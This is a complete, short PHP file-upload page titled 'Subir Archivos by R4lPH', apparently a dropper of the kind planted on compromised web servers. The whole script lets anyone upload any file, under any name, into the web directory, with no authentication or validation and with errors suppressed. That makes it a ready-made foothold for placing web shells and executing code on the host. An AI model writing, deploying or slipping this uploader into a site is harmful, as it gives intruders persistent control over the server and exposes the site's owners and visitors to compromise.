<title>Subir Archivos by R4lPH</title>
<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Archivo subido correctamente.</b><br><br>'; }
	else { echo '<b>Fallo al subir el archivo X_x</b><br><br>'; }
}
?>
